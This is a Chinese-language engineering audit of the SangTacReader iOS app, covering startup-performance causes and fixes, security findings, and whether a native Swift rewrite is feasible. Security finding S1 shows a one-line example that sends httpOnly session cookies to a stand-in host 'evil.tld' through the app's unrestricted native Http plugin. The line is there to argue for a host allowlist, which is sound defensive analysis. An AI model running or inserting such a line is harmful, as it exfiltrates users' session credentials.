# SangTacReader 性能与安全优化方案 · iOS 原生重写可行性分析

- 日期：2026-09-23
- 分析对象：`D:\GitHub_Clone\SangTacReader` @ `d282bd7`（工作区干净）
- 方法：只读代码审计 + 本机对站点的真实探测（可复现脚本见文末 §9）
- 所有数据标注来源；**实测**＝本次或仓库文档里的真实测量，**估算**＝由实测推导，需真机复核

---

## 0. 摘要（先看这一节）

**结论一：启动慢的主因不在我们代码里，而在"站点故意废掉 HTTP 缓存 + 串行加载 + 域探测等待"三件事上，而这三件都能从客户端修掉。**

最值钱的一条：站点给 `/asset/*.js` 的响应头是 `Cache-Control: max-age=86400`（实测），但站点自己在 HTML 里用 `Math.random()` 给这些 URL 加随机参数：

```js
// _page_vip.html（站点外壳内联脚本）
ui.scriptmanager.load("/asset/app.v2.js?" + Math.random(), ...)
link.setAttribute('href', "/asset/app.v2.css?r=" + Math.random())
ui.scriptmanager.load("/asset/app.v2.bookdisplay.js?" + Math.random(), ...)
```

于是**每次冷启动都是全新 URL，WebKit 磁盘缓存永远不可能命中**，`app.v2.js`（59KB wire / 255KB 源）每次都要重新穿越一条 TTFB 500–960ms 的链路，而它正是整个应用的启动闸门（文档实测：`app.v2.js` 求值完在第 **8 秒**，`docs/capacitor-port.md:798`）。

**结论二：注入层自己也有确定性的浪费。** 每个页面加载要在站点脚本之前解析执行 **262.5KB** 注入 JS（18 块 212.9KB + 中译字典 49.6KB，本次实测）；其中 `commentTranslate`(62.5KB) + `pageRepair`(50.5KB) 与首屏无关，而真正画首屏外壳的 `bootShell` 只有 5.4KB 却排在**第 17 位**（`SitePatch.swift:5190-5195`）。

**结论三：安全上有 4 个应当立刻修的点**，其中最实的一个是 **Google 翻译引擎把用户 API Key 拼在 URL 里，而原生 Http 插件把完整 URL 写进日志**——日志面板有 COPY 按钮，Key 会被一键复制出去。

**结论四：全原生 Swift 重写技术上可行但有硬阻塞，不建议现在做。** 用原生 SwiftUI/UIKit 写客户端本身不难，难的是：会话是 httpOnly Cookie + Cloudflare Turnstile、站点接口无契约（改版即崩）、内容版权与许可边界。**推荐路线：先用 A（保持 Capacitor 做优化）拿到 80% 的收益，再评估 B（混合：原生 chrome + 原生阅读器，数据仍走站点接口）。** Liquid Glass 只有在 B/C 才可能真正用上——网页内容不会获得液态玻璃，这是平台机制决定的，不是实现问题。

### 动作排序（按 收益/成本）

| # | 动作 | 预期收益 | 成本 | 风险 |
|---|---|---|---|---|
| P0-1 | 稳定化站点 cache-buster（包装 `ui.scriptmanager.load` + 改写 `/asset/*.css?r=`） | 第二次起冷启动少下约 74KB 关键路径、省 0.5–1.5s；`app.v2.js` 从网络变磁盘 | 半天 | 低（纯包装，保留版本号） |
| P0-2 | 域预置：把上次可用域名提前写入 `domains` | 省 1.4–3.5s 探测等待；避免 dns1 `code 7` 每次 1.2s 重试 | 半天 | 低（保留后台探测） |
| P0-3 | 注入块分级 + 重排（bootShell 提前，113KB 延后） | 首屏前解析量 262KB → 约 60KB | 1 天 | 中（需跑 301 条断言） |
| P0-4 | Http 插件热路径：Cookie 快照、日志懒计算、按需解码 | 每请求省一次全量 Cookie 枚举 + 主线程往返 + 整包解码 | 1 天 | 低 |
| P0-5 | 阅读器资源预取 + 章节内容缓存/相邻章预取 | 首次进正文少 146KB 串行；翻章由 0.7–2.1s 网络变本地 | 1–2 天 | 中 |
| P0-6 | 首屏外壳释放信号改确定性事件 | 外壳提前 1–3s 摘除，减少"假界面"停留 | 半天 | 低 |
| S1–S4 | 安全四项（见 §4） | 消除 Cookie 外泄面、API Key 落日志与明文回显 | 1 天 | 低 |
| P1 | 重库延后、图片懒加载、TTS 去 base64、PCM 批量拷贝、翻译批处理 | 流畅度与内存 | 3–5 天 | 中 |
| P2 | 本地静态资源镜像（离线优先书架） | 冷启动 8s → 1–2s 量级 | 1–2 周 | 高 |

---

## 1. 架构与数据流（证据）

```
iOS App (Capacitor 8, server.url 远程加载)
└─ WKWebView
   ├─ 远程页面 https://sangtacviet.com/app.v2.php     ← 32KB wire(gzip), TTFB 698–1268ms（实测）
   │  ├─ 站点自己的 JS/CSS（≈523KB wire 关键路径，实测见 §2）
   │  └─ 站点自身把 window.Capacitor 当"app 模式"开关
   ├─ WKUserScript @documentStart ×19（18 块 + 中译字典）= 262.5KB 源（实测）
   └─ 3 个自研原生插件
      ├─ SangTacHttpPlugin  URLSession 版 Http + Cookie 桥接（站点所有数据请求走这里）
      ├─ SangTacAppPlugin   App 插件 + 注入 + Keychain 设置备份 + 翻译桥
      └─ SangTacWebNativeViewPlugin  安卓反射桥占位（漫画，小说不调用）
```

关键事实（都有出处）：

- 站点前端按 `window.Capacitor` 存在与否切 app/web 模式；app 模式走 `Capacitor.Plugins.Http` + `x-stv-transport: app`，web 模式走 XHR 撞 Cloudflare（`README.md:12-19`）。
- 站点所有网络请求最终经 `networkManager.bestDomain()` 重写 URL（`_dl_app.v2.js:1140,1190`）。
- 站点自己有 IndexedDB 资源缓存 `rescCacher`（`_page_vip.html` 内联 2.5KB，含 `get/set/loadOffline/updateCache`），说明站点本身就有"资源离线复用"的意图——但当前未用于 `/asset/*.js`。
- 原生层每请求都要重建 Cookie（`SangTacHttpPlugin.swift:397-412`），因为站点会话 Cookie 是 httpOnly、`document.cookie` 读不到（`SangTacHttpPlugin.swift:16-23`）。

---

## 2. 启动慢的根因链（R1–R8）

### R1 站点用 `Math.random()` 废掉了自己的缓存（最贵，最可修）

实测（本机 2026-09-23，直连）：

| 资源 | wire | `Cache-Control` | TTFB |
|---|---|---|---|
| `app.v2.php`（外壳 HTML） | 32KB | `public`（无 max-age） | 698–1268ms |
| `/asset/app.v2.js?<random>` | 59KB | **`max-age=86400`** | 515ms |
| `/asset/app.v2.css?r=<random>` | 10KB | **`max-age=86400`** | 182ms |
| `/asset/app.v2.bookdisplay.js?<random>` | 5KB | **`max-age=86400`** | 888ms |
| `/asset/app.v2.db.js?v2` | — | `max-age=86400` | — |
| `/asset/app.v2.read.js`（无随机） | 32KB | `max-age=86400` | 468ms |
| `/asset/app.v2.chapterdisplay.js`（无随机） | 25KB | `max-age=86400` | 325ms |
| `/hanviet.js`（进正文才加载） | **80KB** | `max-age=86400` | 793ms |
| `stv.ui.js?v=1.360` | 36KB | `max-age=86400` | 327ms |
| `jqr.js` / `bootstrap` / `materialize` | 30/15/57KB | `max-age=86400` | 963/727/503ms |
| `gsap` / `html2canvas` / `iro` / `crypto-js` | 28/59/10/16KB | `max-age=86400` | 618/512/617/962ms |
| `main.css` / `all.min.css` | 8/17KB | `max-age=86400` | 375/476ms |

**关键矛盾**：服务器愿意缓存 24 小时，客户端每次都在 URL 上做随机化。三个被随机化的正是启动闸门（`app.v2.js`）、首屏样式（`app.v2.css`）、书架渲染（`bookdisplay.js`）。

站点加载器的实现（`stv.ui.js`，本次已下载到 `_stv-analysis/stv.ui.js`）：

```js
ui.scriptmanager={stack:{}};
ui.scriptmanager.load = function(scrurl, onload, nocache){
  if(scrurl in this.stack){ /* 去重：已加载则复用 */ return; }
  var sc = document.createElement("script");
  document.head.appendChild(sc);            // 先 append，后设 src（多一次无谓插入）
  sc.onload = function(){ ...; this.remove(); };
  if(nocache){ scrurl += "?nocache=" + Math.random(); }
  sc.src = scrurl;
  this.stack[scrurl] = new Promise(...);
};
```

→ `stack` 按 URL 去重，所以**包装 `load` 并把随机参数换成稳定版本号是安全的**：同一次会话内仍去重，跨会话才复用磁盘缓存。

### R2 串行加载链 × 每资源 TTFB

`scriptmanager.load` 对非 async/defer 脚本是 `await` 串行的（`stv.ui.js` 内 `await new Promise(resolve => ui.scriptmanager.load(script.src, resolve))`）。链是：外壳 HTML → `app.v2.js` →（回调里）`app.v2.config.js` → `app.init()` → 首屏数据。每个环节都要付一次 TTFB（实测 174–963ms，中位约 500ms）。文档也印证：`app.v2.js` 求值完在 **+8s**（`docs/capacitor-port.md:798`）。

### R3 域探测挡在数据前面，且会选错域

`app.v2.js` 求值时就发起 3 个 `/warp.php` 探测（`_dl_app.v2.js:957-990`），`bestDomain()` 只有在 `this.domains` 里存在 alive 记录时才认 `app.config.ux.app_domain`（`:937-943`）——**所以"把上次可用域固化进配置"单独用是无效的**（文档已否掉这个方案，`docs/capacitor-port.md:812-814`）。而 `networkManagerXHR.checkDomains()` 会先 `this.domains = []` 清空（`:1063`），默认域首选 dns1（`:1035`）。

实测代价：文档记录 dns1 探测 1408ms vs sangtacviet.com 3503ms（`:849`），dns1 赢下竞速但 `readchapter` 全部 `code 7`，每次失败 1271ms 并触发换镜像重取（`:833`）。

### R4 262.5KB 注入 JS 在首屏之前，且顺序反了

`SitePatch.all` 的注入顺序（`SitePatch.swift:5190-5195`）：

```
compat(1.8) → diag(16.2) → activityLog(4.2) → tabProbe(3.3) → storageAccessor(2.0)
→ readerDefaults(4.4) → ttsProvider(7.6) → followFallback(2.9) → safeArea(8.6)
→ keyboardPopup(3.1) → gridLayout(3.5) → settingsBackup(14.4) → domainFailover(4.8)
→ bookmarkToggle(3.9) → readerTts(13.8) → pageRepair(50.5) → commentTranslate(62.5)
→ bootShell(5.4) → SiteI18nData(49.6)          （单位 KB，本次实测）
```

`bootShell` 是唯一"让用户在站点 JS 到齐前就看到应用"的块，却排在第 17 位：它前面有 113KB 与首屏无关的解析执行（`pageRepair` 50.5 + `commentTranslate` 62.5）。而且注入脚本是 `WKUserScript` 源码，**不享受 HTTP/字节码缓存**，每次导航都重新解析。

### R5 首屏外壳靠轮询释放

`bootShell` 用 0/1/3/6/10/20s 采样轮询 `document.styleSheets` 找 `app.v2.css`，另有 30s 超时兜底（`SitePatch.swift:5143-5184`）。若样式表在 1.1s 到位，外壳要等到 3s 才摘；这段时间用户看到的是"假界面"。

### R6 Http 插件每请求做全量 Cookie 枚举 + 主线程往返

```swift
// SangTacHttpPlugin.swift:397-412
private func nativeCookies(for url: URL?, _ completion: ...) {
    DispatchQueue.main.async {                       // 每次请求一次主线程跳转
        WKWebsiteDataStore.default().httpCookieStore.getAllCookies { cookies in
            ... 全量枚举 + 逐个 host 后缀匹配
```

首屏书列表会打几十个请求 → 几十次"主线程跳转 + 全量 Cookie 遍历"。Cookie 集是全设备共享的，随浏览历史增长而变慢。

### R7 每请求都做完整诊断工作（即使日志已关）

```swift
// SangTacHttpPlugin.swift:239-248
self.callLog("ok", "...\(url.absoluteString)...")
self.report(tag, "...\(body.count)b in \(elapsedMs())ms " + SangTacHttpPlugin.preview(payload: payload, body: body))
```

`preview()` 会把**整个响应体**解码成 String 再 `split` 再 `join`（`:381-393`），然后 `report()` 做 `JSONSerialization` + `evaluateJavaScript` 跨进程调用（`:364-369`）。Round 14 已经把 JS 侧日志默认关闭（`SitePatch.swift:401-404` 的 `if (!enabled) return;`），**但原生侧的这些开销一分没省**——正文 HTML 动辄几十上百 KB，等于每次请求都白解码一遍。

### R8 阅读器资源与 hanviet.js 首次进正文才串行加载

进正文会依次拉 `/asset/app.v2.read.js`(32KB) → `/asset/app.v2.chapterdisplay.js`(25KB) → `/stv.tts.js?v=7`(9KB)（`_dl_app.v2.read.js` 的 2 次 `scriptmanager.load`），点章还要 `/hanviet.js`(80KB)（`_page_vip.html` 里唯一一处 `scriptmanager.load("/hanviet.js")`）。合计 **146KB** 串行、每次 TTFB 300–800ms → 第一次打开正文的"卡一下"就来自这里。好消息：这些 URL 没有随机参数，第二次就命中缓存；`stack` 去重也允许我们**提前预取**。

---

## 3. 优化方案

### P0-1 稳定化站点 cache-buster（最高性价比）

**改哪里**：`SitePatch.swift` 的 `domainFailover` 或新增一个极小的 `assetCache` 块，放在 `compat` 之后、所有其他块之前（它必须在站点外壳内联脚本跑之前生效——`@documentStart` 已满足）。

**怎么改**（要点）：

1. 包装脚本加载器，把"随机缓存参数"换成稳定令牌：
   ```js
   var TOKEN = 'a' + APP_BUILD;            // 每次发版变一次，同日不变
   function stabilize(url) {
     return String(url)
       .replace(/([?&])(nocache|r)=0\.\d+/g, '$1$2=' + TOKEN)
       .replace(/\?(0\.\d+)$/, '?' + TOKEN)
       .replace(/\/asset\/([^?]+)\?0\.\d+$/, '/asset/$1?' + TOKEN);
   }
   var orig = ui.scriptmanager.load;
   ui.scriptmanager.load = function (url, onload, nocache) {
     return orig.call(this, stabilize(url), onload, nocache);
   };
   ```
2. CSS 是在外壳里 `createElement('link') + setAttribute('href', '/asset/app.v2.css?r='+Math.random())` 后插入的，脚本层拦不到，**改拦插入**：包装 `Node.prototype.appendChild`/`insertBefore`，若节点是 `link[rel=stylesheet]` 且 href 命中 `/asset/*?\?r=0.\d+`，在插入前改写 `href`（插入前改写 = 不会产生一次废请求）。
3. **不要**动 `?v=NNN` 这类真版本号（`stv.ui.js?v=1.360`、`/asset/app.v2.db.js?v2`、`stv.tts.js?v=7`）——那些是站点的版本契约。
4. 留一个"强制刷新资源"入口（设置页一行），把 TOKEN 换成时间戳清缓存，防站点更新后被缓存挡住。

**预期收益**（估算，需真机 BOOT 复核）：第二次及以后冷启动，关键路径少下 74KB（app.v2.js 59 + css 10 + bookdisplay 5），省 0.5–1.5s（取决于当时链路 TTFB），并把"8 秒闸门"里最贵的一步从网络变成磁盘读。

**风险**：低。若站点真的在两次发版之间改了 `/asset/app.v2.js` 内容而版本号不变，会拿到旧文件——用"每日 TOKEN + 手动强制刷新"覆盖。

**验证**：真机 `[Http]` 日志应只在下一次 TOKEN 变更时出现 `/asset/app.v2.js`；`[BOOT] shell released at +Nms` 应显著前移。

### P0-2 域预置（省 1.4–3.5s）

**改哪里**：`domainFailover` 块（已有域名故障转移逻辑，扩成"预置 + 后台刷新"）。

**怎么改**：把上次成功读过正文的域名写进 `localStorage`；在站点脚本跑之前把预置记录塞进两个 manager 的 `domains`，并把 `bestDomain()` 包一层：若缓存域名在有效期内（例如 6 小时）且未被标记坏，直接返回它；同时**照旧**让 `checkDomains()` 在后台跑，探测结果回来后更新（不阻塞首屏）。`networkManagerXHR.checkDomains` 会清空 `domains`（`_dl_app.v2.js:1063`），所以预置必须放在 `bestDomain` 包装里而不是只塞数组。

**预期收益**：省掉 1.4–3.5s 的探测等待；消除"dns1 赢竞速 → 全部 code 7 → 每次 1271ms 重试"的路径。

**风险**：低（保留后台探测与坏域拉黑）。

### P0-3 注入块分级 + 重排

**改哪里**：`SitePatch.all` 顺序（`SitePatch.swift:5190-5195`）+ 每块的入口包装。

**怎么改**：

- 首屏必需（保持 `@documentStart`，约 55KB）：`compat`、`storageAccessor`、`readerDefaults`、`safeArea`、`bootShell`、`domainFailover`、`SiteI18nData`、`diag`（体积小且要抓早期错误）。
- 延后到 `load` / 首帧后 / `requestIdleCallback`：`pageRepair`(50.5)、`commentTranslate`(62.5)、`settingsBackup`(14.4)、`readerTts`(13.8)、`gridLayout`(3.5)、`keyboardPopup`(3.1)、`followFallback`(2.9)、`bookmarkToggle`(3.9)、`activityLog`(4.2)。
  - 其中 `commentTranslate` 只服务评论/社区页、`readerTts` 只服务正文朗读、`pageRepair` 服务下载与详情页——都可以"进入对应页面时才装"，比无条件延后更彻底。
  - 实现上不建议直接改 Swift 注入时机（会丢掉 documentStart 的守卫），而是在这些块的 IIFE 外面套一层 `window.addEventListener('load', ...)` 或 `requestIdleCallback`，让解析成本留在首次导航之后。
- 顺手删掉 `tabProbe`（3.3KB，README 自称"临时"探针，`README.md:62`），或至少默认关闭。

**预期收益**：首屏前解析执行量 262.5KB → 约 60KB（-77%）。解析+编译成本估算（A13 级别，JSC 约 1MB/s 量级保守估计）：省 100–250ms；叠加"不再阻塞首屏"的收益更大。

**风险**：中。必须同步更新 `scripts/test-site-patch.js`（当前 301 条断言，`docs/capacitor-port.md` Round 13 记录）与 `scripts/check-ios-shim.js`（18 块 / 21→24 markers，commit `d282bd7`）。CI 的 marker 列表（`build-ipa.yml:172-185`）也要跟着改。

### P0-4 Http 插件热路径

**改哪里**：`SangTacHttpPlugin.swift`。

1. **Cookie 快照**（`:397-412`）：注册 `WKHTTPCookieStoreObserver`，维护一份内存快照；请求路径读快照（同步、无主线程跳转），Cookie 变化时增量更新。保留"无快照时降级为 `getAllCookies`"。
2. **诊断懒计算**（`:239-248, :364-393`）：由 JS 在开关变化时调用一个 `setDiagnostics(enabled)`，原生侧用一个 `Bool` 闸门；关闭时**连 `preview()` 都不算**（现在是先算再传）。
3. **按需解码**（`:270-289`）：`responsePayload` 现在无条件 `String(data: body, encoding: .utf8)`；改成只在 `default`（text）分支解码，JSON 分支直接 `JSONSerialization`，`blob/arraybuffer` 分支不碰 UTF-8。
4. **日志批量**：多条日志合并成一次 `evaluateJavaScript`（当前每条一次跨进程调用）。
5. 顺带：`session` 配置里给静态资源放宽（已做，`:73-78`），可把磁盘 `URLCache` 提到 512MB 并把内存提到 64MB；给图片/封面单独走一个更大的缓存策略。

**预期收益**：列表页几十个请求 → 省掉几十次主线程往返 + 全量 Cookie 遍历 + 整包解码，累计几百 ms 到 1s 量级。

### P0-5 阅读器预取 + 章节内容缓存

1. **模块预取**：首屏 `load` 之后（空闲时）预先 `ui.scriptmanager.load('/asset/app.v2.read.js')`、`chapterdisplay`、`/stv.tts.js?v=7`、`/hanviet.js`。`stack` 去重保证不会重复加载、站点逻辑无需改动。省掉首次进正文的 146KB 串行。
2. **章节正文缓存**：在 Http 插件层对 `sajax=readchapter` 响应做磁盘 LRU（key = 规范化 URL，容量例如 300 章/100MB），命中直接返回；站点自己的离线库不受影响。
3. **相邻章预取**：拿到章节目录后，后台预取当前章 ±1（并发 2，仅 WiFi/不限速时），翻页即命中。注意别与站点自己的下载任务抢带宽（Round 10 已有限速闸门可复用）。
4. **书架/首页首屏**：站点有 `rescCacher`(IndexedDB) 与 `getCacheLater`；把上次的列表结果缓存下来先渲染、再静默刷新（stale-while-revalidate）。这条与"离线优先"是同一件事，可以分两步做。

**预期收益**：首次进正文省 146KB 串行；翻章从 0.7–2.1s（文档实测服务端耗时，`docs/capacitor-port.md:550`）变成本地命中。

### P0-6 首屏外壳改确定性释放

把 0/1/3/6/10/20s 轮询改成：监听 `<head>` 里 stylesheet 的 `load` 事件（`MutationObserver` + `link.onload`），一旦 `app.v2.css` 就绪立即摘 `stv-boot`；保留超时兜底。收益：外壳提前 1–3s 摘除。

### P1（流畅度 / 内存 / 流量）

- **重库延后/屏蔽**：`html2canvas`(59KB) 只在截图分享用、`iro`(10KB) 只在取色用、`crypto-js`(16KB) 只在加密用、`materialize`(57KB) 大量组件未用。用 `WKContentRuleList` 在启动阶段屏蔽、用到时再放行（规则表可按导航切换），或至少确认站点是否在启动路径上调用它们。`gsap`(28KB) 用于页面切换动画（`popPage` 250ms），不能直接屏蔽，建议保留。
- **图片**：封面统一 `loading="lazy"` + `decoding="async"`，并用原生缓存层给缩略图；列表首屏不要加载全尺寸封面。
- **TTS 去 base64**：当前每句合成走 `WAV → base64(膨胀 33%) → JSON 跨桥 → JS atob/Blob → decodeAudioData`（`NativeSpeech.swift:211`、`_dl_stv.tts.js` 里 6 处 Blob）。改用 `WKURLSchemeHandler`（如 `stvtts://`）或临时文件 URL，让 JS 直接 `fetch`/`<audio src>` 拿到音频，省掉大字符串跨桥与一次解码。
- **PCM 批量拷贝**：`PcmAccumulator.append` 逐样本 `samples.append`（`:386-429`），再 `snapshot()` 整数组拷贝，再 `Data(bytes:)` 拷一次 = 每句 3 次大数组拷贝。改 `reserveCapacity` + `memcpy` 直填。
- **翻译批处理**：评论/帖子翻译逐条发请求（`commentTranslate` 62.5KB 块内），改批量（Azure/Google 都支持一次多段）+ 结果缓存 + 失败退避。
- **`TranslationBridge` 定时任务**：每次会话申请都挂一个 30s 的 `Task.sleep`（`TranslationBridge.swift:171-174`），成功后不取消；改成随请求取消，避免长会话堆积。
- **`diag` 块**：`console` tee 与点击监听只在开启时安装（Round 14 已部分做到，确认 tap listener 也是懒装）。

### P2（结构性，收益最大）

**本地静态资源镜像**：把站点静态资源（`/asset/*.js`、`/asset/*.css`、`/stv.ui.js`、`/jqr.js`、各 vendor 库、`hanviet.js`）打包进 IPA，用一个本地 origin（Capacitor 本地服务器或 `WKURLSchemeHandler`）提供服务，页面外壳也改为本地快照 + 远程数据。这样冷启动的网络部分只剩 API 请求。收益：8s → 1–2s 量级。

**为什么现在不能直接做**：WKWebView 无法拦截/重映射 `https://` 请求（`WKContentRuleList` 只支持 block/block-cookies/css-display-none/make-https，没有"重定向到本地"），所以必须把页面**换成从本地 origin 加载**；而站点的会话 Cookie 是 httpOnly + 域名绑定，本地 origin 下 XHR 带不上 Cookie——好在我们所有数据请求本来就经原生 Http 插件并显式桥接 Cookie（`SangTacHttpPlugin.swift:169-183`），所以这条路是通的，但工作量和回归面都大（登录、Turnstile、Referer 校验、相对路径、内联 token）。

---

## 4. 安全优化（S1–S8）

### S1 Http 插件没有 host 白名单 —— 任意页面可让原生层带着会话 Cookie 去任意域名

`perform()` 只校验 URL 非空与可解析（`SangTacHttpPlugin.swift:143-154`），随后**自动把 `WKWebsiteDataStore` 里的会话 Cookie 合并进请求头**（`:169-183`）。站点被 XSS、或加载了第三方脚本时，一句 `Capacitor.Plugins.Http.get({url:'https://evil.tld/?c='+document.cookie})` 就能把 httpOnly 会话 Cookie 外带。

**修**：插件内维护允许的 host 后缀（`sangtacviet.com/.vip/.app` + 明确需要的翻译 API 域），非白名单直接 `reject`；只允许 `https`；可选校验调用来源（`bridge.webView.url.host`）。

### S2 API Key 进 URL → 进日志 → 可一键复制

`googleBatch` 把用户的 Google Key 拼进 URL（`SitePatch.swift:3934-3941`：`'.../v2?key=' + encodeURIComponent(config.apiKey)`），而原生 Http 插件把**完整 URL** 写进诊断面板与系统日志（`SangTacHttpPlugin.swift:239-248`），面板有 COPY 按钮。

**修**：① Google 引擎改走 `X-goog-api-key` 请求头；② Http 插件日志统一脱敏（`key=`, `apiKey=`, `token=`, `access_token=`, `Authorization`, `Ocp-Apim-Subscription-Key`, `Cookie` 一律替换为 `***`），脱敏函数放在 `preview` 同一层。

### S3 用户 API Key 明文存储 + 明文回显 + 随备份走

- 明文存 `app.storage`（`SitePatch.swift:3796-3808` 的 `storage.set(STORE_KEY, JSON.stringify(next))`，`next` 含 `apiKey`）。
- 被 `settingsBackup` 镜像进 Keychain，`kSecAttrAccessibleAfterFirstUnlock`（`SangTacAppPlugin.swift:300`）——会进入 iCloud/iTunes 备份。
- 设置页用普通文本输入框回显（`SitePatch.swift:4799`）。

**修**：① 设置面板只显示掩码（`sk-••••1234`），不在 DOM 里回填完整 Key；② Key 只存 Keychain，且用 `kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly`（不进备份、不随换机迁移），`app.storage` 里只存"有没有配 Key"的标记；③ 该条目从 `settingsRestore` 的批量回灌里排除，改为按需单独读取。

### S4 App 插件的 Keychain 方法没有来源校验

`settingsSave` / `settingsRestore`（`SangTacAppPlugin.swift:286-340`）对任何页面 origin 都可调用，等于把 Keychain 命名空间（`com.sangtacviet.mobilereader.settings`）开放给页面脚本读写。

**修**：两个方法开头校验 `bridge?.webView?.url?.host` 在允许列表内；并限制单次写入体积与 key 前缀（当前按 key 任意写）。

### S5 allowNavigation 面过大

`capacitor.config.json:11-19` 允许 `sangtacviet.com / .vip / .app` 全子域 + `challenges.cloudflare.com`，且 `limitsNavigationsToAppBoundDomains: false`（`:31`）。若 `.vip`/`.app` 非同一控制方，会话暴露面被放大。

**修**：只保留实际在用的域（当前正文/下载走 `.com` 与 `.app`，登录挑战需要 Cloudflare），其余删掉；并在文档里记录每个域存在的理由。

### S6 注入脚本与站点同上下文

262.5KB 注入代码和站点脚本共享一个 JS 全局环境，站点代码（或任何 XSS）可读取我们所有内部状态，包括翻译设置、诊断缓冲、域名缓存。**无法根治**（这是注入方案的固有代价），降低影响的做法：敏感数据不在页面里长期驻留（S3）、诊断缓冲脱敏（S2）、缓冲区设上限（已有 800 行）。

### S7 传输层

- 仓库不含 `ios/`（由 `cap add ios` 生成），因此 **Info.plist/ATS 配置无法在 Windows 侧审计**。落地时应在 macOS 侧确认：禁用 `NSAllowsArbitraryLoads`，只保留必要例外；若走 P2 的本地服务器，需要 `NSAllowsLocalNetworking`。
- 可选：对 `sangtacviet.com` 做证书固定（`URLSessionDelegate` + SPKI pin），但对 Cloudflare 后端的站点，证书轮换会让 App 直接不可用，收益/风险比一般，**建议不做**。

### S8 侧载现实约束（不是漏洞，但要写进文档）

未签名 IPA 由 SideStore/LiveContainer 本地签名安装：Keychain 的持久化与访问组行为依赖签名证书；换证书/重装后 Keychain 条目可能不可用——现有实现已经把它当"无备份"降级处理（`SangTacAppPlugin.swift:305-309`），这是对的，继续保持。

---

## 5. 用 iOS 原生 Swift 重写：技术可行性

### 5.1 平台事实（先纠正一个常见误解）

| 问题 | 事实 |
|---|---|
| 液态玻璃（Liquid Glass）怎么获得？ | 用最新 SDK 构建后，**标准 SwiftUI/UIKit 组件自动获得**（bars、sheets、popovers、controls）；自定义元素用 `glassEffect(_:in:)`（SwiftUI）/`UIGlassEffect`（UIKit）、按钮样式 `.glass`/`.glassProminent`、分组用 `GlassEffectContainer`、滚动内容压到控件下方用 `safeAreaBar(edge:...)`。来源：[Apple · Adopting Liquid Glass](https://developer.apple.com/documentation/technologyoverviews/adopting-liquid-glass)、[Donny Wals · Designing custom UI with Liquid Glass](https://www.donnywals.com/designing-custom-ui-with-liquid-glass-on-ios-26/) |
| 网页内容会获得液态玻璃吗？ | **不会。** 液态玻璃由系统框架渲染；`WKWebView` 里的 HTML/CSS 不参与。所以现在这个 100% 网页 UI 的 App，用不用最新 SDK 都不影响外观。 |
| 想退出液态玻璃？ | `Info.plist` 加 `UIDesignRequiresCompatibility = YES`（[Donny Wals](https://www.donnywals.com/opting-your-app-out-of-the-liquid-glass-redesign-with-xcode-26/)）。 |
| 当前工程已经在 iOS 26 SDK 上构建了吗？ | Capacitor 8 要求 Xcode 26.0+（[Capacitor 8 升级说明](https://capacitorjs.com/docs/updating/8-0)），CI 用 `macos-26`（`build-ipa.yml:27`）→ **已经是**。但 UI 是网页，视觉上不会变。 |
| 部署目标？ | 插件包 `platforms: [.iOS(.v15)]`（`plugins/*/Package.swift`），因此任何 iOS 26 API 都要 `@available(iOS 26.0, *)` 守卫（现有代码已对 iOS 18 的 `Translation` 框架这么做了，`TranslationBridge.swift:41-50`）。 |

### 5.2 三条路线对比

| | A. 保持 Capacitor + 优化 | B. 混合：原生外壳 + 原生阅读器 | C. 全原生 Swift 客户端 |
|---|---|---|---|
| 内容来源 | 站点网页 | 站点接口（数据）+ 原生渲染 | 站点接口 |
| 液态玻璃 | ✗（网页内容） | ✓（原生 tabbar/工具栏/面板） | ✓（全原生） |
| 启动速度 | 8s → 1–2s（做 P0/P2 后） | 1–2s（原生外壳秒开） | <1s |
| 阅读体验 | 受网页分页/手势限制 | 原生分页、预取、手势（TextKit 2） | 同 B |
| 工作量 | 3–5 天（P0+P1） | 1–3 周 | 1–3 月+ 长期维护 |
| 站点改版风险 | 低（网页自动更新） | 中（阅读器依赖接口格式） | **高（整个客户端依赖私有接口）** |
| 登录/反爬 | 复用网页会话 | 复用网页会话（WebView 仍用于登录） | **硬阻塞**：httpOnly Cookie + Cloudflare Turnstile |
| 许可/法律 | 现状 | 现状 | 需重新评估（站点内容版权、私有接口无授权） |

### 5.3 C（全原生）的硬阻塞（逐条给证据）

1. **会话**：站点会话是 httpOnly Cookie（`SangTacHttpPlugin.swift:16-23` 明确说明 `access/useri2/readcontextid` 等不在 `document.cookie` 里），原生客户端必须自己完成登录流程并保存这些 Cookie；而登录路径要过 **Cloudflare Turnstile**（`capacitor.config.json:18` 专门放行 `challenges.cloudflare.com`；`_dl_app.v2.js` 里也有 `turnstile/v0/api.js` 的加载）。Turnstile 是给浏览器设计的挑战，原生实现要嵌 WebView 走完挑战再取 Cookie——技术上可做，但等于"原生壳 + 网页登录"，已经退化成 B。
2. **接口无契约**：站点全部接口是私有 PHP（`/mobile/bookinfo.php`、`?sajax=readchapter`、`jsonify.php`、`bookmanage.php`、`/io/bookfollow/...`），参数含 `host`/`key`/`bookid` 等站点内部概念；文档里大量"站点自己的 bug"记录（`docs/capacitor-port.md`）说明其行为会变。全原生客户端要自己跟踪这些变化。
3. **反爬/设备判定**：站点按 `x-stv-transport`、`x-requested-with: com.sangtacviet.mobilereader`、`User-Agent`、Referer 综合判定（`SangTacHttpPlugin.swift:9-34`），并且实测存在"某镜像 `readchapter` 恒 `code 7`"这类镜像差异（`:833-849`）。这些规则随时可能收紧。
4. **内容与许可**：站点内容版权属 sangtacviet，本仓库许可是"个人非商业同源开源"（`README.md:130-141`）。全原生客户端会大规模复制站点的数据结构与业务流程，边界更模糊。
5. **收益递减**：C 相比 B 多出来的主要是"书架/搜索页也是原生"的观感；而阅读体验（用户最在意）在 B 里已经能拿到原生实现。

### 5.4 B（混合）的具体落点

- **原生外壳**：`UITabBar`（iOS 26 自动液态玻璃）或 SwiftUI `TabView`，浮在 `WKWebView` 之上；WebView 继续加载站点用于**浏览、搜索、登录、评论**（这些页面依赖站点 JS，不值得重写）。
- **原生阅读器**：正文走 `sajax=readchapter`（返回 HTML），原生解析成段落 → TextKit 2 分页（`NSTextContentManager`/`NSTextLayoutManager`/`NSTextContainer`）→ 原生翻页手势 + 预取下一章 + 本地缓存。中文字体/字号/行距用原生设置面板（液态玻璃 sheet）。
- **原生 TTS**：`AVSpeechSynthesizer` 直接播（不再 WAV→base64→WebAudio），后台播放 + 锁屏控制。
- **原生翻译**：已有 iOS 18 `Translation` 框架桥（`TranslationBridge.swift`），可直接复用。
- **风险控制**：阅读器降级开关——接口解析失败时回落到站点网页阅读器，避免"站点一改版就读不了"。

### 5.5 结论

- **现在做 A**（§3 的 P0+P1 + §4 的安全四项）：3–5 天，拿到启动/流畅度的主要收益，风险最低。
